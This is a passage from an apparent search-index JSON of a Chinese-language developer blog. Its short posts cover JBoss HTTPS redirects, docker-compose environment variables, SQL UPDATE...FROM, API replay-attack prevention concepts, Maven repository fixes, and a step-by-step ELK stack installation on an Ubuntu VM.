development=\"true\"/\u003e \u003cwebsockets/\u003e \u003c/servlet-container\u003e \u003chandlers\u003e \u003cfile name=\"welcome-content\" path=\"${jboss.home.dir}/welcome-content\"/\u003e \u003c/handlers\u003e \u003cfilters\u003e \u003cresponse-header name=\"server-header\" header-name=\"Server\" header-value=\"JBoss-EAP/7\"/\u003e \u003cresponse-header name=\"x-powered-by-header\" header-name=\"X-Powered-By\" header-value=\"Undertow/1\"/\u003e \u003crewrite name=\"http-to-https\" redirect=\"true\" target=\"https://%h:8443%U\"/\u003e \u003c/filters\u003e \u003c/subsystem\u003e ","date":"2021-06-02","objectID":"/blog/posts/Jboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https/:2:0","tags":["jboss","http","https"],"title":"Jboss 設定 http 導 https","uri":"/blog/posts/Jboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https/"},{"categories":["Docker"],"content":"Docker Compose 引用环境变量 - sparkdev - 博客园 之前用 docker-compose 都不知道可以抓環境變數 甚至 .env 也可以抓到 某天看到這個方法 今天來整理一下，不確定是哪個版本才有這個功能 ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:0:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"Bash 環境變數 export IMAGETAG=httpd windows posershell 不知道要怎麼抓 但先不研究 version: '3' services: web: image: ${IMAGETAG} ports: - \"80:80\" redis: image: \"redis:alpine\" ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:1:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"預設環境變數 重新開新的bash version: '3' services: web: image: ${IMAGETAG:-nginx} ports: - \"80:80\" redis: image: \"redis:alpine\" ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:1:1","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"環境變數傳給容器 web: environment: DEBUG: 1 同等於 docker run -e DEBUG=1 ubuntu bash docker run -e DEBUG=1 ubuntu bash echo $DEBUG #1 沒有設定 1 會為 null 請參考如下 web: environment: DEBUG: 再 Linux 設定 DEBUG 環境變數為 1 ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:1:2","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":".env 參考: Environment variables in Compose | Docker Documentation $ cat .env TAG=v1.5 $ cat docker-compose.yml version: '3' services: web: image: \"webapp:${TAG}\" $ docker-compose config version: '3' services: web: image: 'webapp:v1.5' ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:2:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"設定檔案為容器多個環境變數 $ cat .env TAG=v1.5 $ cat ./config/.env.dev TAG=v1.6 $ cat docker-compose.yml version: '3' services: web: image: \"webapp:${TAG}\" $ docker-compose config version: '3' services: web: image: 'webapp:v1.5' $ docker-compose --env-file ./config/.env.dev config version: '3' services: web: image: 'webapp:v1.6' 最下面同等於 docker run --env-file=./config/.env.dev ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"環境變數使用順序 Compose file Shell environment variables Environment file Dockerfile Variable is not defined 首先，在 docker-compose.yml 文件中直接設置的值優先級是最高的。 然後是在當前 shell 中 export 的環境變量值。 接下來是在環境變量文件中定義的值。 再接下來是在 Dockerfile 中定義的值。 最後還沒有找到相關的環境變量就認為該環境變量沒有被定義。 ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:4:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Docker"],"content":"依照環境變數建置測試/正式環境 參考: Docker Compose 引用環境變量 - sparkdev - 博客園 test.sh #!/bin/bash # define env var default value. export IMAGETAG=web:v1 export APPNAME=HelloWorld export AUTHOR=Nick Li export VERSION=1.0 prod.sh #!/bin/bash # define env var default value. export IMAGETAG=webpord:v1 export APPNAME=HelloWorldProd export AUTHOR=Nick Li export VERSION=1.0LTS 可依照 shell 環境變數建立不同環境 還算滿方便的方法 source test.sh $ docker-compose config $ source prod.sh $ docker-compose config ","date":"2021-06-02","objectID":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:5:0","tags":["docker"],"title":"docker-compose 的環境變數設定","uri":"/blog/posts/docker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["SQL"],"content":"最近看到 PostgresSQL 看到 Update … set … from … 看到怎麼會有 from 用再 Update 後來看了一下 sql update set from 的用法 (轉) - IT閱讀 原來是 join 表 後來發現 MySQL 不能用這個寫法 但我印象中有用過 SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記 mysql 可不可以使用 update from 这样语句啊 -CSDN论坛 ","date":"2021-06-02","objectID":"/blog/posts/SQL-UPDATE-SET-FROM-%E7%94%A8%E6%B3%95/:0:0","tags":["sql"],"title":"SQL: UPDATE ... SET ... FROM 用法","uri":"/blog/posts/SQL-UPDATE-SET-FROM-%E7%94%A8%E6%B3%95/"},{"categories":["程式心法"],"content":"最近思考怎麼預防尾造 API 回傳內容，剛好看到這幾篇文章 順便整理一下 数据安全（反爬虫）之「防重放」策略 - SegmentFault 思否 网络安全问题-防篡改、防劫持、防重放_越学越菜的博客-CSDN博客 开放平台API接口安全策略汇总 - 简书 Spring Boot接口如何设计防篡改、防重放攻击 – 前端开发，JQUERY特效，全栈开发，vue开发 簡單來說就是要做 sign 簽章，兩邊用一樣私鑰把內容加密(做簽章)，資料傳到Server 再把私私鑰做簽章，看sign傳過來的值有沒有一樣 這時候我有想到兩邊問題，私鑰被知道不就無解，任何人不就能使用 這邊防禦是以中間人為考量，並非討論App是否被破解取得私鑰 也有想過用公鑰、私鑰做一次加密解密，還時會被APP解析破解取得加密密碼 這時候加入 token 能有效杜絕這個問題(不是開放API的話) api Token 是無狀態，自然可以解決上面問題 session/token (http是无状态协议) - 簡書 ","date":"2021-06-02","objectID":"/blog/posts/API-%E9%98%B2%E9%87%8D%E6%94%BE%E5%B0%8F%E8%A8%98-replay-attack/:0:0","tags":["api","replay","attack"],"title":"API 防重放小記(replay attack)","uri":"/blog/posts/API-%E9%98%B2%E9%87%8D%E6%94%BE%E5%B0%8F%E8%A8%98-replay-attack/"},{"categories":["Java"],"content":"每次都要找很久，所以特別記錄 log4j.logger.org.springframework.transaction.interceptor = trace https://www.itranslater.com/qa/details/2127334888293532672 ","date":"2021-06-02","objectID":"/blog/posts/%E5%9C%A8%E6%97%A5%E8%AA%8C%E4%B8%AD%E9%A1%AF%E7%A4%BASpring%E4%BA%8B%E5%8B%99/:0:0","tags":["spring"],"title":"在日誌中顯示Spring事務","uri":"/blog/posts/%E5%9C%A8%E6%97%A5%E8%AA%8C%E4%B8%AD%E9%A1%AF%E7%A4%BASpring%E4%BA%8B%E5%8B%99/"},{"categories":["Java"],"content":"各種奇怪整裡 ","date":"2021-06-02","objectID":"/blog/posts/Eclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C/:0:0","tags":["eclipse","maven"],"title":"Eclipse 處理 Maven 問題","uri":"/blog/posts/Eclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1 [INFO] Scanning for projects... [WARNING] [WARNING] Some problems were encountered while building the effective model for wsclient:wsclient:jar:0.0.1-SNAPSHOT [WARNING] 'build.plugins.plugin.version' for org.apache.maven.plugins:maven-resources-plugin is missing. @ line 60, column 21 [WARNING] 'build.plugins.plugin.version' for org.apache.maven.plugins:maven-compiler-plugin is missing. @ line 52, column 21 [WARNING] [WARNING] It is highly recommended to fix these problems because they threaten the stability of your build. [WARNING] [WARNING] For this reason, future Maven versions might no longer support building such malformed projects. [WARNING] [INFO] [INFO] Using the builder org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder with a thread count of 1 [INFO] [INFO] ------------------------------------------------------------------------ [INFO] Building finvcbusclient Maven Webapp 0.0.1-SNAPSHOT [INFO] ------------------------------------------------------------------------ [INFO] Downloading: http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom [INFO] ------------------------------------------------------------------------ 發現 http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom 不能下載 加https 就可以了… 後來網路嘗試了各種方法(以下我沒成功，可能是不同狀況) Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1_weixin_30580341的博客-CSDN博客 eclipse加载maven工程提示pom.xml无法解析org.apache.maven.plugins:maven-resources-plugin:2.4.3解决方案_imlmy的专栏-CSDN博客 eclipse建立maven錯誤訊息Could not calculate build plan: Plugin org.apache.maven.plugins:maven-war-plugin:2. | 阿輝的零碎筆記 - 點部落 都沒有成功…. 後來發現是 \u003curl\u003ehttp://people.apache.org/repo/m2-incubating-repository/\u003c/url\u003e 不能訪問 \u003curl\u003ehttps://repo.maven.apache.org/maven2/\u003c/url\u003e 修正完還是不行… 最後加了這個就正常了 java - How to solve maven 2.6 resource plugin dependency? - Stack Overflow \u003crepositories\u003e \u003crepository\u003e \u003csnapshots\u003e \u003cenabled\u003efalse\u003c/enabled\u003e \u003c/snapshots\u003e \u003cid\u003ecentral\u003c/id\u003e \u003cname\u003eCentral Repository\u003c/name\u003e \u003curl\u003ehttps://repo.maven.apache.org/maven2\u003c/url\u003e \u003c/repository\u003e \u003c/repositories\u003e \u003cpluginRepositories\u003e \u003cpluginRepository\u003e \u003creleases\u003e \u003cupdatePolicy\u003enever\u003c/updatePolicy\u003e \u003c/releases\u003e \u003csnapshots\u003e \u003cenabled\u003efalse\u003c/enabled\u003e \u003c/snapshots\u003e \u003cid\u003ecentral\u003c/id\u003e \u003cname\u003eCentral Repository\u003c/name\u003e \u003curl\u003ehttps://repo.maven.apache.org/maven2\u003c/url\u003e \u003c/pluginRepository\u003e \u003c/pluginRepositories\u003e ","date":"2021-06-02","objectID":"/blog/posts/Eclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C/:1:0","tags":["eclipse","maven"],"title":"Eclipse 處理 Maven 問題","uri":"/blog/posts/Eclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C/"},{"categories":["ELK"],"content":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗 本文章參考: Elastic stack（安裝篇) - HackMD 大量操作參照如上 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 Elasticsearch 官方說明的安裝步驟: Download Elasticsearch Free • Get Started Now | Elastic Download and install one of the supported JDKs for Elasticsearch Download and unzip Elasticsearch Run bin/elasticsearch (or bin\\elasticsearch.bat on Windows) Run curl http://localhost:9200/ or Invoke-RestMethod http://localhost:9200 with PowerShell 我這邊用 VM 來安裝 ubuntu 還境 Vagrant box ubuntu/focal64 - Vagrant Cloud vagrant init ubuntu/focal64 vagrant up 可能會遇到這個問題 vagrant 啟動無法自動掛載解決方法 | 程式狂想筆記 vagrant 建議 RAM 調成 3GB VM 設一個可以連的IP ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 JDK (這部分請跳過) 因為我安裝 ElasticSearch 遇到could not find java; set JAVA_HOME or ensure java is in PATH 好像是 deb 安裝才會遇到這個問題 設定 JAVA_HOME 還是無法解決 Elastic Support Matrix | Elasticsearch 我選 Elasticsearch 7.12.x JDK 對應版本選 11 sudo apt-get install openjdk-11-jdk # 確認版本 java --version # openjdk 11.0.11 2021-04-20 # OpenJDK Runtime Environment (build 11.0.11+9-Ubuntu-0ubuntu2.20.04) # OpenJDK 64-Bit Server VM (build 11.0.11+9-Ubuntu-0ubuntu2.20.04, mixed mode, sharing) 設定 JAVA_HOME java - How to set JAVA_HOME in Linux for all users - Stack Overflow # 請查看對印自己Java路徑做調整 JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64 ES_JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:1:1","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 Elasticsearch Download Elasticsearch Free • Get Started Now | Elastic 選對應版本 Install Elasticsearch with Debian Package | Elasticsearch Guide [7.12] | Elastic wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb.sha512 shasum -a 512 -c elasticsearch-7.12.1-amd64.deb.sha512 sudo dpkg -i elasticsearch-7.12.1-amd64.deb 安裝翻車排除 elasticsearch之JAVA环境变量报错：could not find java; set JAVA_HOME or ensure java is in PATH - 峰哥ge - 博客园 設定JAVA_HOME 安裝也沒用 上面 deb 是函JAVA的 目前推估 安裝 deb 才會遇到這個問題 單純抓zip應該可以設定 JAVA_HOME 解決 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:1:2","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"啟動 ElasticSearch sudo service elasticsearch start 確認是否成功 curl http://localhost:9200/ # { # \"name\" : \"ubuntu-focal\", # \"cluster_name\" : \"elasticsearch\", # \"cluster_uuid\" : \"AjrnvASjSG6aWrJIFhzSYg\", # \"version\" : { # \"number\" : \"7.12.1\", # \"build_flavor\" : \"default\", # \"build_type\" : \"deb\", # \"build_hash\" : \"3186837139b9c6b6d23c3200870651f10d3343b7\", # \"build_date\" : \"2021-04-20T20:56:39.040728659Z\", # \"build_snapshot\" : false, # \"lucene_version\" : \"8.8.0\", # \"minimum_wire_compatibility_version\" : \"6.8.0\", # \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" # }, # \"tagline\" : \"You Know, for Search\" # } ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:1:3","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"設定 ElasticSearch 預設是 localhost 連線 要外連預需要設定 /etc/elasticsearch/elasticsearch.yml # By default Elasticsearch is only accessible on localhost. Set a different # address here to expose this node on the network: # #network.host: 192.168.0.1 # # By default Elasticsearch listens for HTTP traffic on the first free port it # finds starting at 9200. Set a specific HTTP port here: # #http.port: 9200 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 Kinbana Install Kibana with Debian package | Kibana Guide [7.12] | Elastic wget https://artifacts.elastic.co/downloads/kibana/kibana-7.12.1-amd64.deb shasum -a 512 kibana-7.12.1-amd64.deb sudo dpkg -i kibana-7.12.1-amd64.deb ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"設定 kibana 設定對外 IP 補充: 這邊 Vagrant 要設定 VM 對外 IP 要把 kibana 設定這個 IP Kibana server is not ready yet 確認本機 ElasticSearch 是否啟動 確認 kibana.yml 裡面 ElasticSearch 設定是否正確(預設為localhost:9200) Kibana server is not ready yet出现的原因_FV8023的博客-CSDN博客 我後來發現 ElasticSearch 重啟的時候 沒辦法啟動，後來 RAM 調大(2GB)就正常了 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:3:1","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"logstash ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 logstash wget https://artifacts.elastic.co/downloads/logstash/logstash-7.12.1-amd64.deb sudo apt install ./logstash-7.12.1-amd64.deb 安裝時候當機，所以RAM調成 3GB 可見這個真的很吃記憶體 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:1","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"Hello World /usr/share/logstash/bin/logstash -e 'input { stdin { } } output { stdout {} }' 我這邊沒看到 Hello World 基本上就是有問題 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:2","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"翻車時間 Using bundled JDK: /usr/share/logstash/jdk OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release. Hello World 系列 - Logstash 後來發現不是翻車，是執行 logstash 需要一段時間(VM效能不好) 跑了一下，我看htop CPU 吃到100% 所以要等一下 Using bundled JDK: /usr/share/logstash/jdk WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults Could not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console [INFO ] 2021-05-01 16:04:55.718 [main] runner - Starting Logstash {\"logstash.version\"=\u003e\"7.12.1\", \"jruby.version\"=\u003e\"jruby 9.2.13.0 (2.5.7) 2020-08-03 9a89c94bcc OpenJDK 64-Bit Server VM 11.0.10+9 on 11.0.10+9 +indy +jit [linux-x86_64]\"} [INFO ] 2021-05-01 16:04:55.779 [main] writabledirectory - Creating directory {:setting=\u003e\"path.queue\", :path=\u003e\"/usr/share/logstash/data/queue\"} [INFO ] 2021-05-01 16:04:55.815 [main] writabledirectory - Creating directory {:setting=\u003e\"path.dead_letter_queue\", :path=\u003e\"/usr/share/logstash/data/dead_letter_queue\"} [WARN ] 2021-05-01 16:04:56.611 [LogStash::Runner] multilocal - Ignoring the 'pipelines.yml' file because modules or command line options are specified [INFO ] 2021-05-01 16:04:56.666 [LogStash::Runner] agent - No persistent UUID file found. Generating new UUID {:uuid=\u003e\"f2a71911-edf5-4c53-bf68-5a31e6ad8dd7\", :path=\u003e\"/usr/share/logstash/data/uuid\"} [INFO ] 2021-05-01 16:04:58.798 [Api Webserver] agent - Successfully started Logstash API endpoint {:port=\u003e9600} [INFO ] 2021-05-01 16:05:00.048 [Converge PipelineAction::Create\u003cmain\u003e] Reflections - Reflections took 101 ms to scan 1 urls, producing 23 keys and 47 values [INFO ] 2021-05-01 16:05:01.424 [[main]-pipeline-manager] javapipeline - Starting pipeline {:pipeline_id=\u003e\"main\", \"pipeline.workers\"=\u003e2, \"pipeline.batch.size\"=\u003e125, \"pipeline.batch.delay\"=\u003e50, \"pipeline.max_inflight\"=\u003e250, \"pipeline.sources\"=\u003e[\"config string\"], :thread=\u003e\"#\u003cThread:0x701b0f11 run\u003e\"} [INFO ] 2021-05-01 16:05:03.202 [[main]-pipeline-manager] javapipeline - Pipeline Java execution initialization time {\"seconds\"=\u003e1.77} WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by com.jrubystdinchannel.StdinChannelLibrary$Reader (file:/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/jruby-stdin-channel-0.2.0-java/lib/jruby_stdin_channel/jruby_stdin_channel.jar) to field java.io.FilterInputStream.in WARNING: Please consider reporting this to the maintainers of com.jrubystdinchannel.StdinChannelLibrary$Reader WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release [INFO ] 2021-05-01 16:05:03.290 [[main]-pipeline-manager] javapipeline - Pipeline started {\"pipeline.id\"=\u003e\"main\"} The stdin plugin is now waiting for input: [INFO ] 2021-05-01 16:05:03.469 [Agent thread] agent - Pipelines running {:count=\u003e1, :running_pipelines=\u003e[:main], :non_running_pipelines=\u003e[]} hello { \"host\" =\u003e \"ubuntu-focal\", \"message\" =\u003e \"hello\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e 2021-05-01T16:05:55.327Z } ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:3","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"設定 logstash 預設會先抓/etc/logstash/conf.d 的config檔案 logstash 預設會先抓/etc/logstash/logstash.yml 2.1 Config Of Logstash · ELK Stack 教學 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:4","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"config 設定 stdin 标准输入(Stdin) | Logstash 最佳实践 input { stdin { add_field =\u003e {\"key\" =\u003e \"value\"} codec =\u003e \"plain\" tags =\u003e [\"add\"] type =\u003e \"std\" } } output{ stdout{} } # 在/usr/share/logstash 執行，stdin.conf 放在這邊執行 sudo bin/logstash -f stdin.conf # { # \"tags\" =\u003e [ # [0] \"add\" # ], # \"host\" =\u003e \"ubuntu-focal\", # \"type\" =\u003e \"std\", # \"key\" =\u003e \"value\", # \"@version\" =\u003e \"1\", # \"message\" =\u003e \":q\", # \"@timestamp\" =\u003e 2021-05-01T16:38:27.958Z # } file log input{ file { path =\u003e [\"/var/log/*.log\", \"/var/log/message\"] type =\u003e \"system\" start_position =\u003e \"beginning\" } } output{ stdout{} } ~ 放在 /etc/logstash/conf/ 裡面 執行 logstash 就能被觸發 其他的就不記了 可參考下面網址 输入插件(Input) | Logstash 最佳实践 GitHub - chenryn/logstash-best-practice-cn: 本书已出版《ELK Stack权威指南》 GitHub - chenryn/ELKstack-guide-cn: ELK Stack 中文指南 output output { stdout { codec =\u003e rubydebug workers =\u003e 2 } } output file output { file { path =\u003e \"/path/to/%{+yyyy/MM/dd/HH}/%{host}.log.gz\" message_format =\u003e \"%{message}\" gzip =\u003e true } } output Elasticsearch output { elasticsearch { host =\u003e \"192.168.0.2\" protocol =\u003e \"http\" index =\u003e \"logstash-%{type}-%{+YYYY.MM.dd}\" index_type =\u003e \"%{type}\" workers =\u003e 5 template_overwrite =\u003e true } } ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:4:5","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"filebeat ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"安裝 